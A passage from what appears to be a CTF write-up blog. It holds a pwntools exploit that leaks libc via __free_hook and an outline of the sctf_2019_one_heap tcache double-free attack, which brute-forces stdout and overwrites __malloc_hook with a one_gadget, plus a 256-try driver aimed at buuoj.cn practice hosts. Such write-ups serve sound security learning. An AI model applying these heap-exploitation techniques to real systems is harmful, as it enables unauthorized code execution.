   0xff000000 # show
]

def exploit():
   io.sendlineafter('PC: ', '0')
   io.sendlineafter('SP: ', '1')
   io.sendlineafter('SIZE: ', str(len(code)))
   io.recvuntil('CODE: ')
   for i in code:
      io.sendline(str(i))

   io.recvuntil('R11: ')
   free_hookh = int(io.recvline()[:-1], 16)
   io.recvuntil('R12: ')
   free_hookl = int(io.recvline()[:-1], 16)
   libc_base = (free_hookh &lt;&lt; 32 | free_hookl) - libc.sym['__free_hook']

   log.info('libc_base: ' + hex(libc_base))
   one_gadget = libc_base + 0x4526a
   io.send(p64(one_gadget))
</code></pre>
<h2 id="sctf-2019-one-heapâ€”â€”1-256-Probability">sctf_2019_one_heapâ€”â€”1/256 Probability</h2>
<p>The idea is to perform a double free to gain control over the <code>tcache_perthread_struct</code>, modify the count for 0x250 chunks, and then free the structure itself to turn it into an unsorted bin.</p>
<p>After reallocating a chunk of size 0x40 or larger, <code>main_arena</code> will shift downward into the <code>next</code> pointer, allowing a partial write to brute-force the <code>stdout</code> address and leak libc.</p>
<p>Finally, directly write the <code>one_gadget</code> into <code>__malloc_hook</code> and adjust <code>realloc_hook+4</code> accordingly.</p>
<p>This challenge requires brute-forcing both the heap address and the <code>stdout</code> address simultaneously, resulting in a success probability of 1/256. A looped exploit script is needed, with the loop section provided below:</p>
<blockquote>
<p>2022/10/23: Buu page 5 completedâ€”celebrations! <em>â˜…,Â°</em>:.â˜†(ï¿£â–½ï¿£)/$:<em>.Â°â˜…</em> ã€‚</p>
</blockquote>
<pre><code class="language-python">if __name__ == '__main__':
   context(arch='amd64', os='linux')#, log_level='debug')
   elf = ELF(elf_path)
   libc = ELF(libc_path)

   for i in range(256):
      io = process(elf_path)
      log.info('i tries: ' + str(i))

      if(sys.argv.__len__() &gt; 1):
         if sys.argv[1] == 'debug':
            gdb.attach(io, 'b calloc')
         elif sys.argv[1] == 'remote':
            io = remote('node4.buuoj.cn', 27751)
         elif sys.argv[1] == 'ssh':
            shell = ssh('fsb', 'node4.buuoj.cn', 25540, 'guest')
            io = shell.process('./fsb')

      try:
         exploit()
         io.interactive()
      except:
         try:
            io.close()
         except:
            pass
   
</code></pre>

</div>


  </div>
</body>
</html>

